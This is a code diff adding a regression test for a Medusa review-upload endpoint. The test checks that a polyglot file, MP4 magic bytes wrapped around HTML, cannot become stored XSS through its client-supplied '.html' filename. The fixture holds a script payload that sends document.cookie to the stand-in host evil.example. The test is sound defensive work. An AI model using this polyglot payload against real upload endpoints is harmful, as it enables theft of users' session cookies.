@@ -51,6 +51,63 @@ medusaIntegrationTestRunner({
         expect(response.status).toEqual(400)
       })
 
+      // C1 regression. The client's filename must never reach the storage
+      // key, because the default (local) file provider derives its key from
+      // the filename verbatim and core mounts that directory with a bare
+      // `express.static`, which picks Content-Type from the EXTENSION and
+      // ignores the mimeType this plugin sniffed. Video is deliberately not
+      // re-encoded, so an HTML/JS payload behind MP4 magic bytes survives
+      // byte-for-byte - and /static is the same origin as the admin
+      // dashboard. The fix is that the stored name is derived ENTIRELY from
+      // the sniffed MIME plus a crypto-random token: no byte of the client
+      // filename reaches the key, sanitized or otherwise.
+      it('never lets the client filename reach the storage key or the served Content-Type', async () => {
+        const payload = Buffer.concat([
+          Buffer.from([0x00, 0x00, 0x00, 0x20]),
+          Buffer.from('ftypisom', 'ascii'),
+          Buffer.from(
+            '\n<html><body><script>fetch("//evil.example/"+document.cookie)</script>PWNED</body></html>',
+            'ascii'
+          ),
+        ])
+
+        const form = new FormData()
+        form.append(
+          'files',
+          new Blob([payload] as BlobPart[], { type: 'video/mp4' }),
+          'pwn.html'
+        )
+
+        const response = await api.post('/store/reviews/uploads', form, {
+          headers: storeHeaders,
+        })
+
+        expect(response.status).toEqual(201)
+
+        const url: string = response.data.media[0].url
+
+        expect(url.endsWith('.html')).toBe(false)
+        expect(url).toMatch(/\.mp4$/)
+        // Not "does not end in .html" alone: no fragment of the attacker's
+        // name may survive anywhere in the key, not as a stem, not as a
+        // sanitized suffix.
+        expect(url).not.toContain('pwn')
+        expect(url).not.toContain('html')
+        expect(response.data.media[0].mime_type).toEqual('video/mp4')
+
+        // The served header is the half that actually decides whether this
+        // is stored XSS. /static is mounted by core's express-loader on the
+        // same app the test harness boots, so it is reachable here.
+        const served = await api.get(new URL(url).pathname, {
+          headers: storeHeaders,
+          responseType: 'arraybuffer',
+        })
+
+        expect(served.status).toEqual(200)
+        expect(served.headers['content-type']).not.toMatch(/text\/html/)
+        expect(served.headers['content-type']).toMatch(/video\/mp4/)
+      })
+
       it('rejects a request with no files', async () => {
         const response = await api
           .post('/store/reviews/uploads', new FormData(), { headers: storeHeaders })
